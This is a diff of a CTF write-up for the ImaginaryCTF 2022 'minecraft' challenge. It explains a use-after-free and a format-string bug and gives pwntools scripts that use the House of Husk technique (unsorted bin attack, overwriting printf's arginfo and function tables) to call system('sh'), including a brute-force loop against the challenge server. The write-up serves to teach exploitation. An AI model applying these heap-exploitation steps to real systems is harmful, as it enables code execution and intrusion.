@@ -1,59 +1,161 @@
 # ImaginaryCTF 2022 - minecraft
 
-Original challenge: https://2022.imaginaryctf.org/Challenges
+### Reference Source
 
-You can also download challenge files in my repo: [minecraft.zip](minecraft.zip)
+https://maxwelldulin.com/BlogPost?post=3107454976
+
+https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507
+
+---
+
+Original challenge link: https://2022.imaginaryctf.org/Challenges
+
+You can also download challenge file in my repo: [minecraft.zip](minecraft.zip)
 
 There will be 3 files in zip:
 - ld-2.27.so
 - libc.so.6
 - vuln
 
-Download and extract, then use `pwninit` to patch libc with binary and we can get started!
+Download and extract, then patch libc to binary and we can get started!
 
-# 3. Exploit
+# 1. Find bug
 
-At first, we have a heap overflow if we malloc a chunk at index 16 first, then a chunk at index 0, the address of second chunk will overwrite the size of first chunk. Hence we can use replace to overwrite stuff.
+At first, by reading the decompiler, we notice there is a **Format String** bug when `(l)eak the end poem`. There is also a **Use-After-Free** bug when we `(b)reak a block` and keep it in inventory and then `(r)eplace a block`. Other options are secured, no of-by-one or any bugs.
 
-But after searching on how2heap, we can see no technique can be used because we also have another bug `Format String` when we leak poem. I tried to debug the function `_Exit()` after that printf but `_Exit()` doesn't use any address in any rw section so we cannot attack `_Exit()` hook or something like that.
+# 2. Idea
 
-Searching for `house of "heap" with "printf"`, we came up with a blog of `pre-yudai` [here](https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507).
+After searching on google `house of "heap" with "printf"`, we end up with a new technique called `House of Husk` which you can find at reference source above.
 
-Due to no libc address, we can use exe stuff. The first try is to overwrite `global_max_fast` by overwrite bk of a freed chunk in unsorted bin as the blog said. Because no libc address can be get so just bruteforce least 2 significant bytes. But before we bruteforce, just run program in static address to be easier when attacking.
+A few things new for me, `main_arena + 0x10` is the start address for saving the address of freed chunk which goes to fastbin:
 
-Then we edit, modify and overwrite `__printf_arginfo_table` and `__printf_function_table` to execute 1 address we want. The source code to check if `__printf_arginfo_table` and `__printf_function_table` is null can be found [here](https://code.woboq.org/userspace/glibc/stdio-common/printf-parsemb.c.html#55):
+![check-main-arena-fastbin.png](images/check-main-arena-fastbin.png)
+
+Next, `global_max_fast` is the maximum size that when we free a chunk with size lower than `global_max_fast`, it will go to fastbin at index `(size - 0x20)/0x10` (with size included metadata). Therefore, if we overwrite `global_max_fast` with a large address and then free a large chunk, it will put this chunk into fastbin but out of bound (usually max index is 6) just in case its size is lower than `global_max_fast`, and it will overwrite some address above `main_arena + 0x10`.
+
+The second new thing for me is that if we overwrite bk pointer of a freed chunk in unsorted bin to a value (example `0xdeadbeef`), the next time we malloc, it will write the address of `main_arena + ??` to `bck->fd`, which means it will write address of `main_arena + ??` to `0xdeadbeef + 0x10` and the unsorted bin is corrupt now:
+
+![remove-from-unsorted-bin.png](images/remove-from-unsorted-bin.png)
+
+`unsorted_chunks (av)` is the address of `main_arena + ??`.
+
+The third new thing is that the technique. We will attack the unsorted bin to overwrite `global_max_fast` and then, freeing a chunk will write the address of chunk to `__printf_function_table` and `__printf_arginfo_table` which is higher than `main_arena`.
+
+The reason for overwrite those 2 table is because of this check in `__parse_one_specmb` ([source](https://elixir.bootlin.com/glibc/glibc-2.27/source/stdio-common/printf-parsemb.c#L61)):
 
 ```c
-if (__builtin_expect (__printf_function_table == NULL, 1)
-  || spec->info.spec > UCHAR_MAX
-  || __printf_arginfo_table[spec->info.spec] == NULL
-  /* We don't try to get the types for all arguments if the format
-     uses more than one.  The normal case is covered though.  If
-     the call returns -1 we continue with the normal specifiers.  */
-  || (int) (spec->ndata_args = (*__printf_arginfo_table[spec->info.spec])
-                               (&spec->info, 1, &spec->data_arg_type,
-                                &spec->size)) < 0)
+if (
+    __builtin_expect (__printf_function_table == NULL, 1) ||
+    spec->info.spec > UCHAR_MAX ||
+    __printf_arginfo_table[spec->info.spec] == NULL ||
+
+    (int) (spec->ndata_args = (*__printf_arginfo_table[spec->info.spec])
+               (&spec->info, 1, &spec->data_arg_type, &spec->size)) < 0)
 {
     ...
 }
 ```
 
-It will first check `__printf_function_table` and if it's not null, it then will check `__printf_arginfo_table` and if it's not null too, the function of `__printf_arginfo_table[spec->info.spec]` will be executed. And because we have overwriten `__printf_arginfo_table[spec->info.spec]` with our desired address, we can execute any address we want.
+Our target is the execution of `__printf_arginfo_table[spec->info.spec]` so that's why we need to make `__printf_function_table` and `__printf_arginfo_table` not null --> the first 3 checks are false so it executes the function inside `__printf_arginfo_table[spec->info.spec]` with `spec->info.spec` is different with each format string we give (ex: if `print("%X")` then it will execute `*__printf_arginfo_table[0x58]`, if `print("%d")` then it will execute `*__printf_arginfo_table[0x64]` because ascii of `X` is `0x58` and ascii of `d` is `0x64`)
 
-The only problem is how to get the string `/bin/sh` or just `sh`. After reading source code of `__parse_one_specwc` [here](https://code.woboq.org/userspace/glibc/stdio-common/printf-parsemb.c.html#55), which is an internal function of printf, we can see that rdi is `spec->info.prec` when our function, which is store in `__printf_arginfo_table[spec->info.spec]`, is executed. Hence, we can have string `sh` in rdi by inputting number and this code of libc will help us parse from number to 2 byte `sh`:
+The first argument is `&spec->info` which is a structure and you can find it [here](https://elixir.bootlin.com/glibc/glibc-2.27/source/stdio-common/printf-parse.h#L26) (structure of `spec`) and [here](https://elixir.bootlin.com/glibc/glibc-2.27/source/stdio-common/printf.h#L34) (structore of `info`). So we need to control `&spec->info.prec` to have a string `sh` and `__printf_arginfo_table[spec->info.spec]` to jump to `system@plt`.
+
+And by viewing the blog of ptr-yudai above, we can have a solve script similar to that blog with a bit change.
+
+Summary:
+- Stage 1: Make script similar to ptr-yudai script
+- Stage 2: Analyze source & Get shell
+
+# 3. Exploit
+
+Before we exploit, I wrote these function for a convenient exploitation:
+
+```python
+def PlaceBlock(idx, len, content):
+    p.sendlineafter(b'poem\n', b'p')
+    p.sendlineafter(b'idx: \n', f'{idx}'.encode())
+    p.sendlineafter(b'len: \n', str(len).encode())
+    p.sendafter(b'block: \n', content)
+
+def ReplaceBlock(idx, content):
+    p.sendlineafter(b'poem\n', b'r')
+    p.sendlineafter(b'idx: \n', f'{idx}'.encode())
+    p.sendafter(b'block: \n', content)
+
+def BreakBlock(idx, keep):
+    p.sendlineafter(b'poem\n', b'b')
+    p.sendlineafter(b'idx: \n', f'{idx}'.encode())
+    p.sendlineafter(b'inventory? \n', keep)
+
+def LeakPoem(idx):
+    p.sendlineafter(b'poem\n', b'l')
+    p.sendlineafter(b'idx: \n', f'{idx}'.encode())
+```
+
+### Stage 1: Make script similar to ptr-yudai script
+
+Debug with gdb and we can get all the neccessary stuffs:
+
+```python
+PRINTF_FUNCTABLE = 0x3f0738
+PRINTF_ARGINFO = 0x3ec870
+GLOBAL_MAX_FAST = 0x3ed940
+MAIN_ARENA = 0x3ebc40
+```
+
+Now, let's malloc and free as the blog show:
+
+```python
+def offset2size(offset):
+    return offset * 2 - 0x10
+
+PlaceBlock(0, 0x500, b'0'*8)        # Use After Free
+PlaceBlock(1, offset2size(PRINTF_FUNCTABLE - MAIN_ARENA), b'1'*8)
+# prepare fake printf arginfo table
+payload = flat(
+    b'\x00'*(ord('X')-2)*8,
+    0xdeadbeef,
+    )
+PlaceBlock(2, offset2size(PRINTF_ARGINFO - MAIN_ARENA), payload)
+PlaceBlock(3, 0x500, b'%X\x00')
+
+# unsorted bin attack
+BreakBlock(0, b'y')
+ReplaceBlock(0, b'A'*8 + p16(0x6940 - 0x10))
+PlaceBlock(0, 0x500, b'0'*8)
+
+# overwrite __printf_arginfo_table and __printf_function_table
+BreakBlock(1, b'n')
+BreakBlock(2, b'n')
+LeakPoem(3)
+
+p.interactive()
+```
+
+> I run script with ASLR disable so we can jump to `0xdeadbeef` easily. Because when attack unsorted bin, we don't know the address of `global_max_fast` so we need to bruteforce 2 bytes. That's the reason for line `ReplaceBlock(0, b'A'*8 + p16(0x6940 - 0x10))` 
+
+> To run without ASLR, add `NOASLR` when executing script. Ex: `python3 run.py NOASLR`
+
+Executing script and attach with gdb, we know it jump to our address `0xdeadbeef`:
+
+![check-rip-in-gdb.png](images/check-rip-in-gdb.png)
+
+Wonderful! Let's modify the code a bit and we can execute `system("sh")`.
+
+### Stage 2: Analyze source & Get shell
+
+Still in source `__parse_one_specmb` ([source](https://elixir.bootlin.com/glibc/glibc-2.27/source/stdio-common/printf-parsemb.c#L61)), as we've discussed that rdi is `&spec->info.prec` and this variable can be modify by us. Searching for string `spec->info.prec` in source and we see this code:
 
 ```c
-/* Get the precision.  */
-spec -> prec_arg = -1;
-/* -1 means none given; 0 means explicit 0.  */
-spec -> info.prec = -1;
 if ( * format == L_('.')) {
     ++format;
     if ( * format == L_('*')) {
         /* The precision is given in an argument.  */
         const UCHAR_T * begin = ++format;
+
         if (ISDIGIT( * format)) {
             n = read_int( & format);
+
             if (n != 0 && * format == L_('$')) {
                 if (n != -1) {
                     spec -> prec_arg = n - 1;
@@ -62,6 +164,7 @@ if ( * format == L_('.')) {
                 ++format;
             }
         }
+
         if (spec -> prec_arg < 0) {
             /* Not in a positional parameter.  */
             spec -> prec_arg = posn++;
@@ -70,108 +173,65 @@ if ( * format == L_('.')) {
         }
     } else if (ISDIGIT( * format)) {
         int n = read_int( & format);
+
+        //// Pay attention here //// 
         if (n != -1)
-            spec -> info.prec = n;         <--------- This one
+            spec -> info.prec = n;
+        //// Pay attention here ////
     } else
         /* "%.?" is treated like "%.0?".  */
         spec -> info.prec = 0;
 }
 ```
 
-Solve script is:
+The code I added comment `Pay attention here` will help us change `spec->info.prec`. Look at this code, we know it will parse our number in `%.<number>d` and add the `<number>` to `spec->info.prec`. So if we can make `spec->info.prec` contain number `26739` which in hex format is `0x6873`, that's the string `sh` we want.
+
+And now, inputing number is an easy job with format string `%d` or `%X` it's up to you but remember to pad correctly because `__printf_arginfo_table[spec->info.spec]` has `spec->info.spec` is the ascii of `d` or `X` that you input. I will use `%d` here so the line:
 
 ```python
-#!/usr/bin/python3
+PlaceBlock(3, 0x500, b'%X\x00')
+```
 
-from pwn import *
-import subprocess
+Changed to:
 
-def placeblock(idx, len, data):
-    p.sendlineafter(b'poem\n', b'p')
-    p.sendlineafter(b'idx: \n', str(idx).encode())
-    p.sendlineafter(b'len: \n', str(len).encode())
-    p.sendafter(b'block: \n', data)
+```python
+PlaceBlock(3, 0x500, b'%.26739d\x00')    # Changed here
+```
 
-def breakblock(idx, keep=b'n'):
-    p.sendlineafter(b'poem\n', b'b')
-    p.sendlineafter(b'idx: \n', str(idx).encode())
-    p.sendlineafter(b'inventory? \n', keep)
+Now, we want to execute system and luckily, we have `system@plt` here so leaking libc is not neccessary now. Just simply change address `0xdeadbeef` above to address of `system@plt` and we can get shell now:
 
-def replaceblock(idx, data):
-    p.sendlineafter(b'poem\n', b'r')
-    p.sendlineafter(b'idx: \n', str(idx).encode())
-    p.sendafter(b'block: \n', data)
-
-def leakpoem(idx):
-    p.sendlineafter(b'poem\n', b'l')
-    p.sendlineafter(b'idx: \n', str(idx).encode())
-
-exe = ELF('./vuln_patched', checksec=False)
-libc = ELF('./libc.so.6', checksec=False)
-context.binary = exe
-context.log_level = 'debug'
-
+```python
 def offset2size(offset):
     return offset * 2 - 0x10
 
-# Cannot overwrite _Exit due to no variable is stored
-__printf_function_table_offset = 0x3f0738
-__printf_function_arginfo_offset = 0x3ec870
-global_max_fast_offset = 0x3ed940
-main_arena = 0x3ebc40
+PlaceBlock(0, 0x500, b'0'*8)        # Use After Free
+PlaceBlock(1, offset2size(PRINTF_FUNCTABLE - MAIN_ARENA), b'1'*8)
+# prepare fake printf arginfo table
+payload = flat(
+    b'\x00'*(ord('d')-2)*8,              # Changed here
+    exe.plt['system'],                   # Changed here
+    )
+PlaceBlock(2, offset2size(PRINTF_ARGINFO - MAIN_ARENA), payload)
+PlaceBlock(3, 0x500, b'%.26739d\x00')    # Changed here
 
-p = process(exe.path)
-# p = remote('golf.chal.imaginaryctf.org', 1337)
+# GDB()
+# unsorted bin attack
+BreakBlock(0, b'y')
+ReplaceBlock(0, b'A'*8 + p16(0x6940 - 0x10))
+PlaceBlock(0, 0x500, b'0'*8)
 
-placeblock(0, 0x500, b'0'*8)
-placeblock(1, offset2size(__printf_function_table_offset - main_arena), b'1'*8)
-placeblock(2, offset2size(__printf_function_arginfo_offset - main_arena), p64(0)*0x62 + p64(0x401110))
-placeblock(3, 0x500, f'%.26739d\x00'.encode() + b'A'*8)
-
-breakblock(0, b'y')
-replaceblock(0, b'A'*8 + p16(0x6940 - 0x10))
-placeblock(0, 0x500, f'%.26739d\x00'.encode())
-
-breakblock(1)
-breakblock(2)
-
-leakpoem(3)
-
-p.interactive()
+# overwrite __printf_arginfo_table and __printf_function_table
+BreakBlock(1, b'n')
+BreakBlock(2, b'n')
+LeakPoem(3)
 ```
 
-To get the padding for `__printf_function_arginfo`, debug with gdb and set breakpoint at `__parse_one_specmb+1568`. Run until that and we know the offset will be the ascii of `d` (from our input) multiplied by 8. Hence, padding will be `0x62` because it takes the address containing metadata of that chunk too.
+As I said in stage 1, we don't have address of `global_max_fast` so we need to bruteforce 2 byte of that. Just put everything in a loop and it will loop until we get shell.
 
-When it can run locally, put the code inside a while loop and loop until we get the shell:
+Full script: [solve.py](solve.py)
 
-```python
-while True:
-    # p = process(exe.path)
-    p = remote('minecraft.chal.imaginaryctf.org', 1337)
+# 4. Get flag
 
-    placeblock(0, 0x500, b'0'*8)
-    placeblock(1, offset2size(__printf_function_table_offset - main_arena), b'1'*8)
-    placeblock(2, offset2size(__printf_function_arginfo_offset - main_arena), p64(0)*0x62 + p64(0x401110))
-    placeblock(3, 0x500, f'%.26739d\x00'.encode() + b'A'*8)
-
-    breakblock(0, b'y')
-    replaceblock(0, b'A'*8 + p16(0x6940 - 0x10))
-    try:
-        placeblock(0, 0x500, f'%.26739d\x00'.encode())
-    except:
-        p.close()
-        continue
-
-    try:
-        breakblock(1)
-        breakblock(2)
-    except:
-        p.close()
-        continue
-
-    leakpoem(3)
-
-    p.interactive()
-```
+![get-flag.png](images/get-flag.png)
 
 Flag is `ictf{pr1ntf_is_p0werful_86b21f38}`
